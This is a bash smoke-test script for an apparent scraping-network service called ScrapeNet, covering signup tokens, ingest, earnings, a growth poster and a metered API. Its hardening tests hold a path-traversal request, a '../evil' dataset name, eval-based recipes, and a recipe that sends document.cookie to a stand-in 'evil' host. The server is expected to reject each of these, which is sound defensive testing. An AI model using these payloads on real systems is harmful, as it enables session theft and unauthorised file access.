#!/bin/bash
# ingest -> records -> publish -> earnings -> ideas -> refine smoke
# + fixer hardening asserts: validation 400s, traversal block, dedupe, sandbox, audit, caps
# + first-users asserts: signup/token auth (401s), extension zip, dataset page, leaderboard
DIR="$(cd "$(dirname "$0")/.." && pwd)"
PORT=$(python3 -c "import json;print(json.load(open('$DIR/needs.json'))['port'])")
BASE="http://127.0.0.1:$PORT"
fail(){ echo "FAIL: $1"; exit 1; }
curl -s "$BASE/api/health" | grep -q '"alive": *true' || fail "health"
curl -s "$BASE/api/recipes" | grep -q product-price || fail "recipes seed (3 recipes)"
curl -s "$BASE/api/recipes" | grep -q job-listing || fail "recipes seed job-listing"
curl -s "$BASE/api/recipes" | grep -q crypto-price || fail "recipes seed crypto-price"
# --- self-serve signup (test flow uses a fresh account) ---
SIGN=$(curl -s -X POST "$BASE/api/signup" -H 'Content-Type: application/json' -d '{"name":"check-bot"}')
echo "$SIGN" | grep -q '"token"' || fail "signup returns token: $SIGN"
echo "$SIGN" | grep -q '"referral_code"' || fail "signup returns referral_code: $SIGN"
NODE=$(echo "$SIGN" | python3 -c "import json,sys;print(json.load(sys.stdin)['node_id'])")
TOKEN=$(echo "$SIGN" | python3 -c "import json,sys;print(json.load(sys.stdin)['token'])")
REFCODE=$(echo "$SIGN" | python3 -c "import json,sys;print(json.load(sys.stdin)['referral_code'])")
[ -n "$NODE" ] && [ -n "$TOKEN" ] || fail "signup ids empty"
# token must not leak into reads
curl -s "$BASE/api/earnings" | grep -q "$TOKEN" && fail "token leaked in earnings"
curl -s "$BASE/api/records?limit=5" | grep -q "$TOKEN" && fail "token leaked in records"
# referral attribution: second signup with the code
SIGN2=$(curl -s -X POST "$BASE/api/signup" -H 'Content-Type: application/json' -d "{\"name\":\"check-friend\",\"referral_code\":\"$REFCODE\"}")
echo "$SIGN2" | grep -q "$NODE" || fail "referral attribution (referred_by): $SIGN2"
curl -s -X POST "$BASE/api/signup" -H 'Content-Type: application/json' -d '{"name":"x","referral_code":"NOPE00"}' | grep -q '"error"' || fail "bad referral code must 400"
curl -s -X POST "$BASE/api/signup" -H 'Content-Type: application/json' -d '{"name":""}' | grep -q '"error"' || fail "empty signup name must 400"
# auth gates: fresh unknown node without token must 401
curl -s -X POST "$BASE/api/ingest" -H 'Content-Type: application/json' -d '{"node_id":"node-never-heard-of","dataset":"product-prices","records":[{"a":1}]}' | grep -q '"error"' || fail "unauth ingest must fail"
curl -s -X POST "$BASE/api/ingest" -H 'Content-Type: application/json' -d '{"node_id":"node-never-heard-of","dataset":"product-prices","records":[{"a":1}]}' | grep -qi 'token\|signup' || fail "401 must hint signup/token"
curl -s -X POST "$BASE/api/publish" -H 'Content-Type: application/json' -d '{"dataset":"product-prices"}' | grep -q '"error"' || fail "unauth publish must fail"
curl -s -X POST "$BASE/api/recipes" -H 'Content-Type: application/json' -d '{"id":"no-auth","name":"x","fn":"function transform(r){return r;}"}' | grep -q '"error"' || fail "unauth recipe create must fail"
NONCE="$(date +%s)-$$"
ING=$(curl -s -X POST "$BASE/api/ingest" -H 'Content-Type: application/json' -d "{\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"dataset\":\"product-prices\",\"recipe_id\":\"product-price\",\"wallet\":\"SCRAPE1check\",\"records\":[{\"name\":\"Check Widget $NONCE\",\"price\":1.23,\"currency\":\"USD\",\"url\":\"https://shop.example/p/ck\"}]}")
echo "$ING" | grep -q '"accepted": *1' || fail "ingest: $ING"
# wrong token must 401 even for a known node
curl -s -X POST "$BASE/api/ingest" -H 'Content-Type: application/json' -d "{\"node_id\":\"$NODE\",\"token\":\"wrong\",\"dataset\":\"product-prices\",\"records\":[{\"a\":1}]}" | grep -q '"error"' || fail "wrong token must fail"
# legacy pre-auth node (node-check) still writes without token (grandfathered migration)
LEG=$(curl -s -X POST "$BASE/api/ingest" -H 'Content-Type: application/json' -d "{\"node_id\":\"node-check\",\"dataset\":\"product-prices\",\"recipe_id\":\"product-price\",\"records\":[{\"name\":\"Legacy Check $NONCE\",\"price\":2.0,\"url\":\"https://shop.example/p/leg\"}]}")
echo "$LEG" | grep -q '"accepted": *1' || fail "legacy grandfathered ingest: $LEG"
DUP=$(curl -s -X POST "$BASE/api/ingest" -H 'Content-Type: application/json' -d "{\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"dataset\":\"product-prices\",\"recipe_id\":\"product-price\",\"records\":[{\"name\":\"Check Widget $NONCE\",\"price\":1.23,\"currency\":\"USD\",\"url\":\"https://shop.example/p/ck\"}]}")
echo "$DUP" | grep -q '"duplicates_skipped": *1' || fail "dedupe: $DUP"
curl -s "$BASE/api/records?dataset=product-prices&limit=5" | grep -q "Check Widget" && fail "test rows leaked into default records"
curl -s "$BASE/api/records?dataset=product-prices&limit=5&include_test=1" | grep -q "Check Widget" || fail "records filter (audit)"
PUB=$(curl -s -X POST "$BASE/api/publish" -H 'Content-Type: application/json' -d "{\"dataset\":\"product-prices\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\"}")
echo "$PUB" | grep -q '/api/public/product-prices' || fail "publish: $PUB"
echo "$PUB" | grep -q "$NODE" || fail "publish attributed to authed node: $PUB"
echo "$PUB" | grep -q 'test_rows_hidden' || fail "publish honesty meta: $PUB"
# test-published snapshot: hidden from the public product by default
# (honest 404 + audit hint), served on the audit surface.
curl -s "$BASE/api/public/product-prices" | grep -q 'no honest rows' || fail "test-published public must 404 by default"
curl -s "$BASE/api/public/product-prices?include_test=1" | grep -q 'test_rows_hidden' || fail "public endpoint (audit)"
# check-* signups are test:true per needs.json test_node_patterns, so the
# PUBLIC money story must hide them (default) and the audit surface must
# reveal them (?include_test=1) — assert both sides of that contract.
curl -s "$BASE/api/earnings" | grep -q "$NODE" && fail "test node leaked into public earnings"
curl -s "$BASE/api/earnings?include_test=1" | grep -q "$NODE" || fail "earnings ledger (audit)"
curl -s "$BASE/api/earnings" | grep -q '"commission"' || fail "earnings commission math"
curl -s "$BASE/api/earnings" | grep -q '"billable_records"' || fail "earnings caps fields"
curl -s "$BASE/api/earnings?include_test=1" | grep -q '"referral_earnings"' || fail "earnings referral split fields (audit)"
curl -s "$BASE/api/leaderboard" | grep -q '"leaders"' || fail "leaderboard endpoint"
curl -s "$BASE/api/leaderboard?include_test=1" | grep -q "$REFCODE" || fail "referrer listed on leaderboard (audit)"
IDEAS=$(curl -s -X POST "$BASE/api/ideas" -H 'Content-Type: application/json' -d '{"dataset":"product-prices"}')
echo "$IDEAS" | python3 -c "import json,sys;d=json.load(sys.stdin);assert len(d['ideas'])>=3, d;print('ideas OK:',[i['title'] for i in d['ideas']])" || fail "ideas"
REF=$(curl -s -X POST "$BASE/api/refine" -H 'Content-Type: application/json' -d '{"sample":[{"name":"A","price":1},{"name":"A","price":1},{"name":"B","price":""}],"fn":"x"}')
echo "$REF" | python3 -c "import json,sys;d=json.load(sys.stdin);assert d['dupes_removed']==1,d;assert 'quality_score' in d and 'suggestions' in d,d;print('refine OK q=',d['quality_score'])" || fail "refine: $REF"
curl -s "$BASE/" | grep -q "ScrapeNet" || fail "first paint"
curl -s "$BASE/" | grep -qi "Install extension" || fail "install card unmissable on first paint"
curl -s "$BASE/" | grep -q "download/extension.zip" || fail "landing links the zip"
python3 -c "import json;json.load(open('$DIR/extension/manifest.json'));print('manifest OK')"
# --- first-visitor asserts ---
curl -s -o /tmp/e083-ext.zip "$BASE/download/extension.zip" || fail "zip download"
python3 - "$BASE" <<'EOF' || fail "zip manifest invalid"
import sys, urllib.request, zipfile, io, json
raw = urllib.request.urlopen(sys.argv[1] + "/download/extension.zip").read()
z = zipfile.ZipFile(io.BytesIO(raw))
names = z.namelist()
assert "manifest.json" in names, names
m = json.loads(z.read("manifest.json"))
assert m.get("manifest_version") == 3, m
for f in ("adapters/registry.js", "adapters/x.js", "adapters/google.js", "adapters/product.js", "adapters/article.js", "content.js", "background.js", "popup.js"):
    assert f in names, (f, names)
print("zip OK:", sorted(names))
EOF
curl -s "$BASE/dataset/product-prices" | grep -q "product-prices" || fail "dataset page"
curl -s "$BASE/dataset/product-prices" | grep -q "api/public/product-prices" || fail "dataset page API link"
curl -s "$BASE/dataset/product-prices?ref=$REFCODE" | grep -q "$REFCODE" || fail "dataset page ref attribution"
curl -s "$BASE/dataset/no-such-dataset-xyz" | grep -q '"error"' || fail "bad dataset must 404"
# --- hardening asserts ---
curl -s "$BASE/api/records?limit=abc" | grep -q '"error"' || fail "limit=abc must 400"
curl -s --path-as-is "$BASE/../server/app.py" | grep -q '"error": "not found"' || fail "traversal must 404"
curl -s -X POST "$BASE/api/ingest" -H 'Content-Type: application/json' -d '{"node_id":"","dataset":"product-prices","records":[{"a":1}]}' | grep -q '"error"' || fail "empty node_id must 400"
curl -s -X POST "$BASE/api/ingest" -H 'Content-Type: application/json' -d "{\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"dataset\":\"../evil\",\"records\":[{\"a\":1}]}" | grep -q '"error"' || fail "bad dataset must 400"
curl -s -X POST "$BASE/api/ingest" -H 'Content-Type: application/json' -d "{\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"dataset\":\"d\",\"records\":[1]}" | grep -q '"error"' || fail "non-object record must 400"
curl -s -X POST "$BASE/api/publish" -H 'Content-Type: application/json' -d "{\"dataset\":\"never-existed-check\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\"}" | grep -q '"error"' || fail "publish empty must 400"
curl -s -X PUT "$BASE/api/recipes" -H 'Content-Type: application/json' -d '{"fn":"x"}' | grep -q '"error"' || fail "PUT missing id must 400"
curl -s -X DELETE "$BASE/api/recipes?id=no-such-recipe&node_id=$NODE&token=$TOKEN" | grep -q 'recipe not found' || fail "DELETE bad id must 404"
curl -s -X DELETE "$BASE/api/recipes?id=product-price" | grep -q '"error"' || fail "unauth DELETE must fail"
SBAD=$(curl -s -X POST "$BASE/api/recipes/test" -H 'Content-Type: application/json' -d '{"fn":"function transform(r){fetch(\"https://evil/x?c=\"+document.cookie);return r;}"}')
echo "$SBAD" | grep -q '"ok": *false' || fail "sandbox must reject exfil fn: $SBAD"
SGOOD=$(curl -s -X POST "$BASE/api/recipes/test" -H 'Content-Type: application/json' -d '{"fn":"function transform(raw,ctx){return raw.cards||[];}"}')
echo "$SGOOD" | grep -q '"ok": *true' || fail "sandbox must accept clean fn: $SGOOD"
curl -s -X POST "$BASE/api/recipes" -H 'Content-Type: application/json' -d "{\"id\":\"evil-check\",\"name\":\"evil\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"fn\":\"function transform(r){eval(1);return r;}\"}" | grep -q '"error"' || fail "malicious recipe store must 400"
# authed recipe roundtrip (create + delete with token, header style)
RC=$(curl -s -X POST "$BASE/api/recipes" -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" -d "{\"id\":\"check-tmp-$NONCE\",\"name\":\"tmp\",\"dataset\":\"product-prices\",\"node_id\":\"$NODE\",\"schema\":[\"a\"],\"fn\":\"function transform(raw,ctx){return [];}\"}")
echo "$RC" | grep -q "check-tmp-$NONCE" || fail "recipe create with token: $RC"
curl -s -X DELETE "$BASE/api/recipes?id=check-tmp-$NONCE&node_id=$NODE&token=$TOKEN" | grep -q '"ok": *true' || fail "recipe delete with token"
curl -s "$BASE/api/audit?limit=5" | grep -q '"event"' || fail "audit log endpoint"
curl -s "$BASE/api/audit?limit=5" | grep -q "$TOKEN" && fail "token leaked in audit"
curl -s "$BASE/api/audit?limit=abc" | grep -q '"error"' || fail "audit bad limit must 400"
# --- ux + telemetry asserts (same schema as e082 so funnels match) ---
EV1=$(curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d '{"v":1,"session":"check-sess-1","ts":1,"page":"/","event":"page_view"}')
echo "$EV1" | grep -q '"ok": *true' || fail "events page_view: $EV1"
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d '{"v":1,"session":"check-sess-1","ts":2,"page":"/","event":"download","detail":"extension.zip"}' | grep -q '"ok"' || fail "events download"
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d '{"v":1,"session":"check-sess-1","ts":3,"page":"/","event":"signup","detail":"x"}' | grep -q '"ok"' || fail "events signup"
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d '{"v":1,"session":"check-sess-2","ts":4,"page":"/","event":"idle_45s"}' | grep -q '"ok"' || fail "events idle_45s"
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d '{"v":1,"session":"check-sess-1","ts":5,"page":"/","event":"click:bRefresh"}' | grep -q '"ok"' || fail "events click"
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d '{"v":1,"session":"check-sess-1","ts":6,"page":"/","event":"first_proof_seen"}' | grep -q '"ok"' || fail "events first_proof_seen"
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d '{"v":1,"session":"check-sess-1","ts":7,"page":"/","event":"js_error","detail":"x"}' | grep -q '"ok"' || fail "events js_error"
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d '{"v":2,"session":"check-sess-1","ts":8,"page":"/","event":"page_view"}' | grep -q '"error"' || fail "events bad v must 400"
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d '{"v":1,"session":"bad session!!","ts":8,"page":"/","event":"page_view"}' | grep -q '"error"' || fail "events bad session must 400"
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d '{"v":1,"session":"check-sess-1","ts":8,"page":"/","event":"nope"}' | grep -q '"error"' || fail "events bad name must 400"
FUN=$(curl -s "$BASE/api/funnel")
echo "$FUN" | python3 -c "import json,sys;d=json.load(sys.stdin);assert all(k in d for k in ('views','downloads','signups','publishes','stuck_sessions','bots_hidden','bots_total','verdict')),d;assert d['views']>=1 and d['publishes']>=1,d;assert d['verdict']['level'] in ('NOISE','FAILING','HEALTHY','QUIET','WATCH'),d;assert d['verdict']['line'],d;print('funnel OK:',{k:d[k] for k in ('views','downloads','signups','publishes','bots_hidden')},d['verdict']['level'])" || fail "funnel: $FUN"
# FUNNEL-TRUTH mirror: own polls are bots — hidden by default, revealed by ?bots=1
echo "$FUN" | python3 -c "import json,sys;d=json.load(sys.stdin);assert not any((r.get('session') or '').startswith('check-') for r in d['stuck_sessions']),d;print('bot exclusion OK: no check-* in default stuck list')" || fail "funnel bot exclusion"
curl -s "$BASE/api/funnel?bots=1" | python3 -c "import json,sys;d=json.load(sys.stdin);got=[r for r in d['stuck_sessions'] if r.get('session')=='check-sess-2'];assert got and got[0]['synthetic'] is True,d;assert all(r.get('short') and r.get('last_at') is not None for r in d['stuck_sessions']),d;print('bot toggle OK: check-sess-2 revealed as synthetic')" || fail "funnel bot toggle"
FBOT="check-funnel-$(date +%s)"
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -d "{\"v\":1,\"session\":\"$FBOT\",\"ts\":1,\"page\":\"/\",\"event\":\"page_view\"}" | grep -q '"ok"' || fail "bot fixture ingest"
curl -s "$BASE/api/funnel" | python3 -c "import json,sys;d=json.load(sys.stdin);assert not any(r.get('session')=='$FBOT' for r in d['stuck_sessions']),d;assert d['bots_hidden']>=1,d;print('fresh bot hidden OK')" || fail "fresh bot exclusion"
python3 - "$DIR" <<'EOF' || fail "funnel verdict rules"
import sys; sys.path.insert(0, sys.argv[1] + "/server"); import app
assert app.funnel_verdict(6, 1, 4, 1, 0)["level"] == "NOISE"
assert app.funnel_verdict(6, 0, 1, 0, 1)["level"] == "FAILING"
assert app.funnel_verdict(6, 2, 4, 0, 1)["level"] == "HEALTHY"
assert app.funnel_verdict(2, 0, 0, 0, 1)["level"] == "QUIET"
assert app.is_bot_session("check-sess-1") and app.is_bot_session("growth-probe")
assert not app.is_bot_session("s5bfc5e4b26a2")
print("verdict rules OK")
EOF
GEN=$(curl -s -X POST "$BASE/api/generate" -H 'Content-Type: application/json' -d '{"html":"<div class=\"product-card\"><h3>Acme Phone</h3><span>$299.00</span></div>"}')
echo "$GEN" | python3 -c "import json,sys;d=json.load(sys.stdin);assert d.get('ok') and d['kind']=='price',d;assert 'function transform' in d['recipe']['fn'],d;assert 'llm_available' in d,d;print('generate OK:',d['kind'],d['explanation'])" || fail "generate: $GEN"
curl -s -X POST "$BASE/api/generate" -H 'Content-Type: application/json' -d '{"html":""}' | grep -q '"error"' || fail "generate empty must 400"
curl -s -X POST "$BASE/api/generate" -H 'Content-Type: application/json' -d '{"url":"ftp://x"}' | grep -q '"error"' || fail "generate bad url must 400"
RAWING=$(curl -s -X POST "$BASE/api/ingest" -H 'Content-Type: application/json' -d "{\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"dataset\":\"product-prices\",\"recipe_id\":\"product-price\",\"raw\":{\"url\":\"https://shop.example/p/ck\",\"cards\":[{\"name\":\"Check Widget $NONCE\",\"price\":\"1.23\"}]},\"records\":[{\"name\":\"Raw Proof $NONCE\",\"price\":1.23,\"url\":\"https://shop.example/p/ck\"}]}")
echo "$RAWING" | grep -q '"accepted": *1' || fail "ingest with raw: $RAWING"
CAP=$(curl -s "$BASE/api/last-capture")
python3 - "$DIR" "$BASE" <<'EOF' || fail "last-capture honest default: $CAP"
import sys, json, urllib.request
sys.path.insert(0, sys.argv[1] + "/server"); import app
d = json.loads(urllib.request.urlopen(sys.argv[2] + "/api/last-capture").read())
assert d["node_id"] not in app.test_node_ids(), d
assert not app._matches_test(d["node_id"]), d
print("last-capture honest default OK:", d["node_id"], d["dataset"])
EOF
CAPA=$(curl -s "$BASE/api/last-capture?include_test=1")
echo "$CAPA" | python3 -c "import json,sys;d=json.load(sys.stdin);assert d['record']['name'].startswith('Raw Proof'),d;assert d['has_raw'] is True,d;assert 'function transform' in d.get('recipe_fn',''),d;print('last-capture audit OK (Raw Proof revealed)')" || fail "last-capture audit: $CAPA"
PAY=$(curl -s "$BASE/api/last-payout")
echo "$PAY" | python3 -c "import json,sys;d=json.load(sys.stdin);assert 'equation' in d and 'records x' in d['equation'] and 'commission' in d['equation'],d;assert d['node_id']=='real-collector-10b278',d;print('last-payout OK:',d['equation'])" || fail "last-payout: $PAY"
curl -s "$BASE/api/recipes" | grep -q '"where"' || fail "recipes expose where badge"
curl -s -X POST "$BASE/api/recipes" -H 'Content-Type: application/json' -d "{\"id\":\"where-bad-$NONCE\",\"name\":\"w\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"where\":\"mars\",\"fn\":\"function transform(raw,ctx){return [];}\"}" | grep -q '"error"' || fail "bad where must 400"
RC2=$(curl -s -X POST "$BASE/api/recipes" -H 'Content-Type: application/json' -d "{\"id\":\"where-both-$NONCE\",\"name\":\"w\",\"dataset\":\"product-prices\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"where\":\"both\",\"fn\":\"function transform(raw,ctx){return [];}\"}")
echo "$RC2" | grep -q '"both"' || fail "where=both stored: $RC2"
curl -s -X DELETE "$BASE/api/recipes?id=where-both-$NONCE&node_id=$NODE&token=$TOKEN" | grep -q '"ok": *true' || fail "cleanup where recipe"
curl -s "$BASE/" | grep -q 'api/events' || fail "landing ships telemetry snippet"
curl -s "$BASE/" | grep -q 'Show last capture' || fail "landing has proof button"
curl -s "$BASE/" | grep -q 'Generate from sample' || fail "landing has AI-prefill"
curl -s "$BASE/" | grep -q 'Get token' || fail "landing has one-click token"
curl -s "$BASE/" | grep -q 'CLIENT' || fail "landing shows WHERE badge"
python3 "$DIR/test/commission_test.py" || fail "commission math"
# --- adapters (e083): headless unit + manifest + server op-set/suggest ---
node "$DIR/test/adapters_test.js" || fail "adapters unit"
python3 - "$DIR/extension/manifest.json" <<'EOF' || fail "manifest adapters"
import json, os, sys
m = json.load(open(sys.argv[1]))
assert m.get("manifest_version") == 3, m
js = m["content_scripts"][0]["js"]
for f in ("adapters/registry.js", "adapters/x.js", "adapters/google.js", "adapters/product.js", "adapters/article.js", "content.js"):
    assert f in js and os.path.isfile(os.path.join(os.path.dirname(sys.argv[1]), f)), f
print("manifest adapters OK:", js)
EOF
SUG=$(curl -s -X POST "$BASE/api/recipes/suggest" -H 'Content-Type: application/json' -d '{"url":"https://shop.example/list","html":"<div class=\"it\"><a href=\"/a\">One two three four five</a></div><div class=\"it\"><a href=\"/b\">Six seven eight nine ten</a></div><div class=\"it\"><a href=\"/c\">More words here yes yes</a></div>"}')
echo "$SUG" | grep -q '"proposed_ops"' || fail "suggest returns ops: $SUG"
echo "$SUG" | grep -q '"confidence"' || fail "suggest returns confidence"
TR=$(curl -s -X POST "$BASE/api/transform" -H 'Content-Type: application/json' -d '{"ops":[{"op":"css-select","selector":"div.it","fields":{"t":{"attr":"text"}}}],"raw":{"html":"<div class=\"it\">Hi</div>"}}')
echo "$TR" | grep -q '"count": *1' || fail "transform css-select: $TR"
curl -s -X POST "$BASE/api/transform" -H 'Content-Type: application/json' -d '{"ops":[{"op":"eval","code":"1"}],"raw":{}}' | grep -q '"error"' || fail "transform must reject non-allowlist ops"
ORC=$(curl -s -X POST "$BASE/api/recipes" -H 'Content-Type: application/json' -d "{\"id\":\"check-ops-$NONCE\",\"name\":\"ops\",\"dataset\":\"product-prices\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\",\"fn\":\"\",\"where\":\"server\",\"ops\":[{\"op\":\"json-path\",\"path\":\"items[*]\"}]}")
echo "$ORC" | grep -q "check-ops-$NONCE" || fail "ops-only recipe create: $ORC"
curl -s -X DELETE "$BASE/api/recipes?id=check-ops-$NONCE&node_id=$NODE&token=$TOKEN" | grep -q '"ok": *true' || fail "ops recipe delete"
# --- growth loop asserts (autonomous poster: queue -> approve -> tick -> stats) ---
GQ=$(curl -s "$BASE/api/growth/queue")
echo "$GQ" | python3 -c "import json,sys,datetime;d=json.load(sys.stdin);ps=[p for p in d['posts'] if p.get('source')!='loop'];assert len(ps)==7,ps;today=datetime.date.today();
for p in ps:
    assert p['text'] and p['link'],p; assert '?ref=growth' in p['text'] and '?ref=growth' in p['link'],p
    assert len(p['text'])<=280,(p['id'],len(p['text'])); assert p['approved'] is True,p
    datetime.date.fromisoformat(p['scheduled_for'])
assert ps[0]['scheduled_for']==today.isoformat(),ps[0]
print('growth queue OK: 7 days from live data, all linked ?ref=growth, all <=280 chars')" || fail "growth queue: $GQ"
# approve: unauth must 401, bad id must 404, good id must ok (token-authed)
GID=$(echo "$GQ" | python3 -c "import json,sys;print(json.load(sys.stdin)['posts'][0]['id'])")
curl -s -X POST "$BASE/api/growth/approve" -H 'Content-Type: application/json' -d "{\"id\":\"$GID\"}" | grep -q '"error"' || fail "unauth approve must fail"
curl -s -X POST "$BASE/api/growth/approve" -H 'Content-Type: application/json' -d "{\"id\":\"no-such-post\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\"}" | grep -q 'not found' || fail "approve bad id must 404"
APR=$(curl -s -X POST "$BASE/api/growth/approve" -H 'Content-Type: application/json' -d "{\"id\":\"$GID\",\"node_id\":\"$NODE\",\"token\":\"$TOKEN\"}")
echo "$APR" | grep -q '"approved": *true' || fail "approve: $APR"
# attribution close: signup with ?ref=growth attributes; human-like visit counts
GSIGN=$(curl -s -X POST "$BASE/api/signup" -H 'Content-Type: application/json' -d '{"name":"check-bot-growth","referral_code":"growth"}')
echo "$GSIGN" | grep -q '"referred_by": *"growth"' || fail "growth referral attribution: $GSIGN"
curl -s -X POST "$BASE/api/signup" -H 'Content-Type: application/json' -d '{"name":"check-bot-growth2","referral_code":"GROWTH"}' | grep -q '"referred_by": *"growth"' || fail "GROWTH case-insensitive"
V0=$(curl -s "$BASE/api/growth/stats" | python3 -c "import json,sys;print(json.load(sys.stdin)['growth_visits'])")
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -A 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36' -d '{"v":1,"session":"growth-visitor-1","ts":1,"page":"/dataset/product-prices","event":"click:ref-GROWTH","detail":"GROWTH"}' | grep -q '"ok"' || fail "growth visit beacon"
V1=$(curl -s "$BASE/api/growth/stats" | python3 -c "import json,sys;print(json.load(sys.stdin)['growth_visits'])")
[ "$V1" -gt "$V0" ] || fail "growth visits must increment ($V0 -> $V1)"
curl -s "$BASE/api/growth/stats" | python3 -c "import json,sys;d=json.load(sys.stdin);assert all(k in d for k in ('posts_total','posts_posted','last_post','growth_visits','growth_signups','paid_net','paywall_live','next_run')),d;assert d['posts_total']==7+d.get('loop_drafts',0),d;print('growth stats OK: posts->visits->signups->paid', {k:d[k] for k in ('posts_total','growth_visits','growth_signups','paid_net')})" || fail "growth stats"
# test/prod contract, same as earnings/leaderboard: agent check-bot growth
# signups hide by default (honest zero while no stranger has used a ref code)
# and reveal on the audit surface.
curl -s "$BASE/api/growth/stats?include_test=1" | python3 -c "import json,sys;d=json.load(sys.stdin);assert d['growth_signups']>=1,d;print('growth audit OK:',d['growth_signups'],'attributed signups')" || fail "growth stats audit"
# --- honest-counters asserts (agent exhaust hidden everywhere by default) ---
# records: default carries zero test rows, audit reveals them with test:true
python3 - "$BASE" <<'EOF' || fail "records honesty"
import sys, json, urllib.request
base = sys.argv[1]
pub = json.loads(urllib.request.urlopen(base + "/api/records?limit=500").read())
assert pub, "no honest rows at all - collector dead?"
assert all(r.get("test") is False for r in pub), [r for r in pub if r.get("test") is not False]
aud = json.loads(urllib.request.urlopen(base + "/api/records?limit=500&include_test=1").read())
assert len(aud) > len(pub), (len(aud), len(pub))
assert any(r.get("test") is True for r in aud)
print("records honesty OK: default=%d audit=%d" % (len(pub), len(aud)))
EOF
# ideas + brief count honest rows only
curl -s "$BASE/api/ideas?dataset=product-prices" | grep -q '"rows": *0' || fail "ideas product-prices honest zero"
curl -s "$BASE/api/ideas?dataset=crypto-spot" | python3 -c "import json,sys;d=json.load(sys.stdin);assert d['rows']>=1 and d['fields'],d;print('ideas crypto OK:',d['rows'])" || fail "ideas crypto-spot"
# ?agent sessions never pump growth visits
VAG0=$(curl -s "$BASE/api/growth/stats" | python3 -c "import json,sys;print(json.load(sys.stdin)['growth_visits'])")
curl -s -X POST "$BASE/api/events" -H 'Content-Type: application/json' -A 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36' -d '{"v":1,"session":"growth-agent-1","agent":"check-agent-1","ts":1,"page":"/dataset/crypto-spot","event":"click:ref-GROWTH","detail":"GROWTH"}' | grep -q '"ok"' || fail "agent growth visit beacon"
VAG1=$(curl -s "$BASE/api/growth/stats" | python3 -c "import json,sys;print(json.load(sys.stdin)['growth_visits'])")
[ "$VAG1" = "$VAG0" ] || fail "agent session pumped growth visits ($VAG0 -> $VAG1)"
# brief hero cites honest counts only (recomputed from the ledger, not trusted)
python3 - "$DIR" "$BASE" <<'EOF' || fail "brief honesty"
import sys, json, urllib.request
sys.path.insert(0, sys.argv[1] + "/server"); import app
b = json.loads(urllib.request.urlopen(sys.argv[2] + "/api/brief").read())
rate = float(app.cfg().get("payout_per_record", 0.01))
honest_today = sum(1 for r in app.load_lines(app.p("records_path", "data/records.jsonl"))
                 if str(r.get("at", ""))[:10] == app.utc_day()
                 and r.get("node_id") not in app.test_node_ids())
assert b["records_today"] == honest_today, (b["records_today"], honest_today)
assert b["earned_today"] == round(honest_today * rate, 4), b
print("brief honesty OK: records_today=%d earned_today=%s" % (b["records_today"], b["earned_today"]))
EOF
# scheduler tick (dryrun): posts due item to outbox, second tick is idempotent
bash "$DIR/bin/growth.sh" one | grep -qi "tick" || fail "growth tick"
OUT=$(cat "$DIR/data/outbox.jsonl" 2>/dev/null)
echo "$OUT" | grep -q "$GID" || fail "outbox must hold due post $GID: $OUT"
echo "$OUT" | grep -q 'dryrun' || fail "default backend must be dryrun"
N1=$(grep -c "$GID" "$DIR/data/outbox.jsonl")
bash "$DIR/bin/growth.sh" one >/dev/null 2>&1
N2=$(grep -c "$GID" "$DIR/data/outbox.jsonl")
[ "$N1" = "$N2" ] || fail "outbox dedupe: $GID posted twice ($N1 -> $N2)"
tail -n 1 "$DIR/data/growth.jsonl" | grep -q '"status"' || fail "growth log data/growth.jsonl"
curl -s "$BASE/" | grep -q 'secGrowth' || fail "dashboard Growth card"
curl -s "$BASE/dataset/product-prices?ref=GROWTH" | grep -q 'api/events' || fail "dataset page ref beacon"
# --- paywall + metered API asserts ---
curl -s "$BASE/api/config" | grep -q '"tiers"' || fail "config exposes tiers"
curl -s "$BASE/api/config" | python3 -c "import json,sys;d=json.load(sys.stdin);assert all('secret' not in k.lower() for k in d),[k for k in d if 'secret' in k.lower()];print('no secret keys in config')" || fail "config must not leak stripe_secret"
ME=$(curl -s "$BASE/api/me?node_id=$NODE&token=$TOKEN")
echo "$ME" | grep -q '"tier": *"free"' || fail "me tier free: $ME"
echo "$ME" | grep -q '"quota_left"' || fail "me quota_left: $ME"
echo "$ME" | grep -q '"quota_limit"' || fail "me quota_limit: $ME"
echo "$ME" | grep -q '"resets_at"' || fail "me resets_at: $ME"
echo "$ME" | grep -q '"datasets_limit"' || fail "me datasets_limit: $ME"
curl -s "$BASE/api/me?node_id=$NODE&token=wrong" | grep -q '"error"' || fail "me wrong token must 401"
curl -s "$BASE/api/records?limit=1&token=$TOKEN&include_test=1" | grep -q "Check Widget" || fail "metered records with token (audit)"
ME2=$(curl -s "$BASE/api/me?node_id=$NODE&token=$TOKEN")
echo "$ME2" | python3 -c "import json,sys;d=json.load(sys.stdin);assert d['quota_used']>=1,d;assert d['quota_left']==d['quota_limit']-d['quota_used'],d;print('metering OK used=',d['quota_used'])" || fail "quota counted: $ME2"
curl -s -D - "$BASE/api/records?limit=1&token=$TOKEN" -o /dev/null | grep -qi "X-Quota-Left" || fail "quota headers"
